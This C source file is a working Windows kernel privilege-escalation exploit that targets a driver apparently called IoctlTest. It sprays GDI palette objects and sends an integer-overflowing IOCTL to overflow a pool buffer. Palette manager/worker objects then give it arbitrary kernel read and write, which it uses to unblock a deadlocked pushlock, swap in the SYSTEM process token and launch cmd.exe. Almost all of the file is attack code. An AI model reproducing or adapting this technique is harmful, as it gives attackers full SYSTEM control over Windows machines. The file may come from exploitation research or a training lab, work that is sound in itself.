
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strsafe.h>
#include <intrin.h>

#define SIOCTL_TYPE 40000
//
// The IOCTL function codes from 0x800 to 0xFFF are for customer use.
//
#define IOCTL_SIOCTL_METHOD_BUFFERED \
    CTL_CODE( SIOCTL_TYPE, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS  )

struct renderEntry {
	INT x;
	INT y;
	INT z;
};

struct render {
	ULONG maxNumEntries;
	ULONG minNumEntries;
	struct renderEntry renderEntry[1];
};

HPALETTE hMgr, hWrk, hTmpMgr, hBlocked;
ULONGLONG blockedObject, kprocess, token, object;

DWORD WINAPI WakeUpThread(LPVOID lpParam);
VOID readAddr(PVOID addr, BYTE *data, ULONG size);
VOID writeAddr(PVOID addr, BYTE *data, ULONG size);
ULONGLONG GetSystemToken(VOID);

HPALETTE hPal[4096], hPal2[4096], hPad[32];

int __cdecl
main(
	_In_ ULONG argc,
	_In_reads_(argc) PCHAR argv[]
)
{
	STARTUPINFOA StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	HANDLE hDevice, hToken, hProcess;
	BOOL bRc;
	ULONG bytesReturned;
	DWORD errNum = 0;
	struct render *render;
	LOGPALETTE *pal2, *pal, *pal3;
	BYTE *buffer;
	INT i;

	buffer = (BYTE *)malloc(0x430 * sizeof(PALETTEENTRY));
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
	/* 0xbe0 allocations */
	pal = (LOGPALETTE *)malloc(sizeof(*pal) + 0x2d0 * sizeof(PALETTEENTRY));
	pal->palVersion = 0x300;
	pal->palNumEntries = 0x2d0;
	for (i = 0; i < 4096; i++)
		hPal[i] = CreatePalette(pal);

	/* 0x420 allocations */
	pal2 = (LOGPALETTE *)malloc(sizeof(*pal2) + 0xe0 * sizeof(PALETTEENTRY));
	pal2->palVersion = 0x300;
	pal2->palNumEntries = 0xe0;
	printf("THREAD1: spraying with palette\n");
	for (i = 0; i < 4096; i++)
		hPal2[i] = CreatePalette(pal2);

	hDevice = CreateFileA("\\\\.\\IoctlTest",
			GENERIC_READ | GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Error: CreatFile Failed : %d\n", GetLastError());
		return -1;
	}
	

	render = (struct render *)malloc(sizeof(struct render) + sizeof(renderEntry) * 0x15a);
	memset(render->renderEntry, '\0', sizeof(renderEntry) * 0x15a);
	render->maxNumEntries = 0x55555565 + 0x46;
	render->minNumEntries =  0x15a;

	/* Handle */
	render->renderEntry[341].y = 1;
	render->renderEntry[343].z = 0x41414141;
	
	/* Create holes */
	for (i = 0; i < 4096; i += 8)
		DeleteObject(hPal2[i]);
	
	printf("THREAD1: issue ioctl that will allocate vuln buffer and overflow the pallete\n");
	bRc = DeviceIoControl(hDevice,
		(DWORD)IOCTL_SIOCTL_METHOD_BUFFERED,
		(PCHAR)render,
		sizeof(struct render) + sizeof(renderEntry) * 0x15a,
		buffer,
		sizeof(buffer),
		&bytesReturned,
		NULL
	);

	if (!bRc) {
		fprintf(stderr, "Error in DeviceIoControl : %d\n", GetLastError());
		return -1;

	}
	
	CreateThread(NULL, 0, WakeUpThread, NULL, 0, NULL);
	printf("THREAD1: calls SetPaletteEntries for each palette and overwrites the next palette with a valid handle\n");
	printf("THREAD1: and then deadlocks\n\n");
	for (i = 0; i < 4096 - 3; i++) {
		hBlocked = hPal2[i];
		hTmpMgr = hPal2[i + 1];
		/* correct the handle and change length*/
		*(__int64 *)(buffer + 0x1010 - 0x98) = (__int64)hTmpMgr;
		*(DWORD *)(buffer + 0x102c - 0x98) = 0x3000;
		if (SetPaletteEntries(hPal2[i], 0, 0x3e6, (PALETTEENTRY *)buffer) == 0x3e6)
			break;
	}

	printf("THREAD1: I am awake.. \\o/\n");
	Sleep(5000);

	/*
	ffffeebd4495f000 size:  be0 previous size:    0  (Allocated)  Gh08
	*ffffeebd4495fbe0 size:  420 previous size:  be0  (Allocated) *3SR. VULN BUFFER

	ffffeebd`44960000 size:  be0 previous size:    0  (Allocated)  Gh08 rsv
	ffffeebd`44960be0 size:  420 previous size:  be0  (Allocated)  Gh08 hBlocked (Thread 1 Blocks here)

	ffffeebd44961000 size:  be0 previous size:    0  (Allocated)  Gh08  rsv2
	ffffeebd44961be0 size:  420 previous size:  be0  (Allocated)  Gh08  hTmpMgr

	ffffeebd44962000 size:  be0 previous size:    0  (Allocated)  Gh08  hMgr
	ffffeebd44962be0 size:  420 previous size:  be0  (Allocated)  Gh08  hWorker
	*/

	
	for (i = 0; i < 4096; i++) {
		if (hMgr == hPal[i])
			break;
	}

	
	object = blockedObject & ~0xfff;
	
	/* Read from hMgr */
	readAddr((PVOID)(object + 0x2000), buffer, 0xbe0);
	
	/* Fix rsv */
	writeAddr((PVOID)object, buffer, 0xbe0);

	*(ULONGLONG *)buffer = 0x3830684723be0000;
	writeAddr((PVOID)object, buffer, 8);

	*(HPALETTE *)buffer = hPal[i - 2];
	writeAddr((PVOID)(object + 0x10), buffer, 8);

	/* Fix hBlocked */
	object += 0xbe0;
	*(ULONGLONG *)buffer = 0x38306847234200be;
	writeAddr((PVOID)object, buffer, 8);
	
	/* Fix rsv2 */
	object += 0x420;

	/* Read from hMgr */
	readAddr((PVOID)((blockedObject & ~0xfff) + 0x2000), buffer, 0xbe0);
	writeAddr((PVOID)object, buffer, 0xbe0);
	
	*(ULONGLONG *)buffer = 0x3830684723be0000;
	writeAddr((PVOID)object, buffer, 8);

	*(HPALETTE *)buffer = hPal[i - 1];
	writeAddr((PVOID)(object + 0x10), buffer, 8);

	/* Fix hTmpMgr */
	object += 0xbe0;
	*(ULONGLONG *)buffer = 0x38306847234200be;
	writeAddr((PVOID)object, buffer, 8);

	/* Fix hMgr */
	object += 0x420;
	*(ULONGLONG *)buffer = 0x3830684723be0000;
	writeAddr((PVOID)object, buffer, 8);

	/* Fix hWorker */
	object += 0xbe0;
	*(ULONGLONG *)buffer = 0x38306847234200be;
	writeAddr((PVOID)object, buffer, 8);
	printf("THREAD1: replaces the system token..\n");
	/* Get and replace token */
	token = GetSystemToken();
	writeAddr((PVOID)(kprocess + 0x358), (BYTE *)&token, 8);
	token &= ~0xf;

	scanf("%d", &i);
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo);
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
	
	CreateProcessA("c:\\windows\\system32\\cmd.exe",
		"c:\\windows\\system32\\cmd.exe",
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo);

	return 0;
}

DWORD WINAPI WakeUpThread(LPVOID lpParam)
{
	BYTE *leak;
	ULONGLONG blockedThread, addr, waitBlock, pushlock0, pushlock1, data;
	ULONGLONG threadList, curThread, object;
	INT i;

	/*
	ffffeebd4495f000 size:  be0 previous size:    0  (Allocated)  Gh08
	*ffffeebd4495fbe0 size:  420 previous size:  be0  (Allocated) *3SR. VULN BUFFER
	
	ffffeebd`44960000 size:  be0 previous size:    0  (Allocated)  Gh08 rsv    
	ffffeebd`44960be0 size:  420 previous size:  be0  (Allocated)  Gh08 hBlocked (Thread 1 Blocks here)    

	ffffeebd44961000 size:  be0 previous size:    0  (Allocated)  Gh08  rsv2   
	ffffeebd44961be0 size:  420 previous size:  be0  (Allocated)  Gh08  hTmpMgr   

	ffffeebd44962000 size:  be0 previous size:    0  (Allocated)  Gh08  hMgr 
	ffffeebd44962be0 size:  420 previous size:  be0  (Allocated)  Gh08  hWorker 
	*/

	Sleep(5000);

	printf("THREAD2: reads the heap to find the KTHREAD in ObjectHdr->tid\n");
	leak = (BYTE *)malloc(0x430 * sizeof(PALETTEENTRY));
	GetPaletteEntries(hTmpMgr, 0, 0x3fe, (PALETTEENTRY *)leak);

	/* Get KTHREAD of deadlocked thread */
	blockedThread = *(ULONGLONG *)(leak + 0x388 + 0x20);
	//printf("[+] ETHREAD = %llx\n", blockedThread);

	/* Mgr points to worker */
	hMgr = *(HPALETTE *)(leak + 0x388 + 0x10);
	//printf("[+] hMgr %llx\n", hMgr);

	/* Set hMgr point to hWorker */
	object = *(ULONGLONG *)(leak + 0x388 + 0x88);
	object &= ~0xfff;
	*(ULONGLONG *)(leak + 0x388 + 0x88) = object + 0xbe0 + 0x88;
	//printf("[+] hMgr object %llx\n", object);

	/* Set hWorker length */
	*(DWORD *)(leak + 0x388 + 0x2c) = 0x10000;

	/* Read worker handle */
	hWrk = *(HPALETTE *)(leak + 0x388 + 0xbf0);

	/* Set the changes */
	SetPaletteEntries(hTmpMgr, 0, 0x3fe, (PALETTEENTRY *)leak);


	memset(leak, '\0', 0x430 * sizeof(PALETTEENTRY));
	printf("THREAD2: reads `KTHREAD->LockEntries[1]` that has the pushlock, that contains the waitblock as value\n");
	/* Read `KTHREAD->LockEntries[1]` */
	readAddr((PVOID)(blockedThread + 0x320 + 0x60), leak, 0x60);

	/* Contains address of pushlock1 */
	pushlock1 = *(ULONGLONG *)(leak + 0x20);
	//printf("zero entry %llx\n", pushlock1);

	/* Contains address of waitblock */
	readAddr((PVOID)pushlock1, (BYTE *)&waitBlock, 0x8);

	printf("THREAD2: sets the waitblock as there is only one waiter\n");
	/* set waitblock for 1 waiter */
	waitBlock = (waitBlock & ~0xf) | 3;
	writeAddr((PVOID)pushlock1, (BYTE *)&waitBlock, 0x8);
	waitBlock = (waitBlock & ~0xf);
	//printf("[+] WaitBlock 0x%llx\n", waitBlock);
	data = 0;
	writeAddr((PVOID)(waitBlock + 0x18), (BYTE *)&data, 8);
	writeAddr((PVOID)(waitBlock + 0x20), (BYTE *)&waitBlock, 8);
	data = 0xFFFFFFFE;
	writeAddr((PVOID)(waitBlock + 0x30), (BYTE *)&data, 4);

	data = 0;

	printf("THREAD2: reads `KTHREAD->LockEntries[0]` that has the pushlock, of the object that we corrupted\n");
	// Read `KTHREAD->LockEntries[0]`
	readAddr((PVOID)(blockedThread + 0x320), leak, 0x60);

	/* Contains address of pushlock0 of blocked object entry */
	pushlock0 = *(ULONGLONG *)(leak + 0x20);
	//printf("[+] Entry %llx\n", pushlock0);

	/* Release pushlock0 */
	writeAddr((PVOID)pushlock0, (BYTE *)&data, 8);

	/* Read blockedObject */
	readAddr((PVOID)(pushlock0 + 8), (BYTE *)&blockedObject, 8);
	//printf("[+] blockedObject %llx\n", blockedObject);

	/* Read _KPROCESS */
	readAddr((PVOID)(blockedThread + 0x220), (BYTE *)&kprocess, 8);
	//printf("[+] _KPROCESS %llx\n", kprocess);

	/* Read _KPROCESS->threadList */
	readAddr((PVOID)(kprocess + 0x38), (BYTE *)&threadList, 8);

	/* Get current  KTHREAD */
	curThread = threadList - 0x2f8;
	//printf("Current Thread %llx\n", curThread);

	/* Get current KTHREAD flags */
	readAddr((PVOID)(curThread + 0x78), (BYTE *)&data, 8);
	printf("THREAD2: sets the AutoBoostEntriesExhausted\n");
	/* Write AutoBoostEntriesExhausted to KTHREAD flags */
	data |= (1 << 0x10);
	writeAddr((PVOID)(curThread + 0x78), (BYTE *)&data, 8);

	printf("THREAD2: call Set/GetPaletteEntries that will call hmgShareLockCheck that will wake up the thread\n\n");
	/* Wake up thread */
	GetPaletteEntries(hBlocked, 0, 1, (PALETTEENTRY *)&data);

	/* Fix the hBlocked handle */
	writeAddr((PVOID)blockedObject, (BYTE *)&hBlocked, 8);

	/* lock entry steps */
	*(ULONGLONG *)(leak + 0x18) = 0x32;
	*(ULONGLONG *)(leak + 0x20) = 0;
	*(ULONGLONG *)(leak + 0X58) = 0;
	writeAddr((PVOID)(blockedThread + 0x320), leak, 0x60);
	writeAddr((PVOID)(curThread + 0x320), leak, 0x60);
	data = 0;

	/* Release pushlock0 */
	writeAddr((PVOID)pushlock0, (BYTE *)&data, 8);

	

	free(leak);

	return 0;
}

VOID readAddr(PVOID address, BYTE *data, ULONG size)
{

	/* Set addr */
	SetPaletteEntries(hMgr, 0, 2, (PALETTEENTRY *)&address);

	/* Read */
	GetPaletteEntries(hWrk, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY *)data);
}

VOID writeAddr(PVOID address, BYTE *data, ULONG size)
{
	
	/* Set addr */
	SetPaletteEntries(hMgr, 0, 2, (PALETTEENTRY *)&address);

	/* Write */
	SetPaletteEntries(hWrk, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY *)data);
}

ULONGLONG GetSystemToken(VOID)
{
	ULONGLONG systemToken, activeProcessLinks;
	DWORD entryPid;

	readAddr((PVOID)(kprocess + 0x358), (BYTE *)&token, 8);

	/* Find process by pid */
	activeProcessLinks = kprocess + 0x2e8;

	do {
		/* Get next process */
		readAddr((PVOID)activeProcessLinks, (BYTE *)&activeProcessLinks, 8);

		/* Get pid */
		readAddr((PVOID)(activeProcessLinks - 8), (BYTE *)&entryPid, 8);
	} while (entryPid != 4);
	readAddr((PVOID)(activeProcessLinks + 0x70), (BYTE *)&systemToken, 8);

	return systemToken;
}